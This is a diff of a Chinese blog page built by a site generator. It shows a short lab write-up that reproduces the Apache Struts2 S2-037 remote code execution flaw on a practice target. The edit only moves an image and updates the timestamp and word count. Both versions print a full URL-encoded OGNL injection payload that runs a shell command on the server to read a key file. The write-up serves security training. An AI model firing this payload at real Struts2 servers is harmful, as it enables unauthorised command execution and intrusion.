@@ -979,12 +979,12 @@
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title='更新时间: 2019-08-15 17:46:46'>2019-08-15 16:55</time>
+        创建时间:<time class="date" title='更新时间: 2019-08-15 17:49:53'>2019-08-15 16:55</time>
         
     </div>
     <div class="article-meta">
         
-        <span>字数:137</span>
+        <span>字数:135</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -1019,9 +1019,8 @@
     <div class="article-entry" itemprop="articleBody">
       
         <p>访问网页，根据题目，出现S2-037漏洞，在使用REST插件时，可以传递可用于在服务器端执行任意代码的恶意表达式。访问下面链接，得到key。（不用开启动态方法调用）</p>
-<pre><code>219.153.49.228:48940&#x2F;orders&#x2F;3&#x2F;%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%2c%23process%3d%40java.lang.Runtime%40getRuntime().exec(%23parameters.command%5b0%5d)%2c%23ros%3d(%40org.apache.struts2.ServletActionContext%40getResponse().getOutputStream())%2c%40org.apache.commons.io.IOUtils%40copy(%23process.getInputStream()%2c%23ros)%2c%23ros.flush()%2c%23xx%3d123%2c%23xx.toString.json?command=cat%20key.txt
-![](1.png)</code></pre>
-<p>也可以使用工具，得到key。<br><img src="/2019/08/15/83、Apache Struts2远程代码执行漏洞（S2-037）复现/2.png" alt></p>
+<pre><code>219.153.49.228:48940&#x2F;orders&#x2F;3&#x2F;%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%2c%23process%3d%40java.lang.Runtime%40getRuntime().exec(%23parameters.command%5b0%5d)%2c%23ros%3d(%40org.apache.struts2.ServletActionContext%40getResponse().getOutputStream())%2c%40org.apache.commons.io.IOUtils%40copy(%23process.getInputStream()%2c%23ros)%2c%23ros.flush()%2c%23xx%3d123%2c%23xx.toString.json?command=cat%20key.txt</code></pre>
+<p><img src="/2019/08/15/83、Apache Struts2远程代码执行漏洞（S2-037）复现/1.png" alt><br>也可以使用工具，得到key。<br><img src="/2019/08/15/83、Apache Struts2远程代码执行漏洞（S2-037）复现/2.png" alt></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证 </span>
@@ -1032,10 +1031,10 @@
 
 <div class="article_copyright">
     <p><span class="copy-title">文章标题:</span>83、Apache Struts2远程代码执行漏洞（S2-037）复现</p>
-    <p><span class="copy-title">文章字数:</span><span class="post-count">137</span></p>
+    <p><span class="copy-title">文章字数:</span><span class="post-count">135</span></p>
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="qiandaizhi">qiandaizhi</a></p>
     <p><span class="copy-title">发布时间:</span>2019-08-15, 16:55:31</p>
-    <p><span class="copy-title">最后更新:</span>2019-08-15, 17:46:46</p>
+    <p><span class="copy-title">最后更新:</span>2019-08-15, 17:49:53</p>
     <span class="copy-title">原始链接:</span><a class="post-url" href="/2019/08/15/83、Apache Struts2远程代码执行漏洞（S2-037）复现/" title="83、Apache Struts2远程代码执行漏洞（S2-037）复现">http://qiandaizhi.com/2019/08/15/83、Apache Struts2远程代码执行漏洞（S2-037）复现/</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
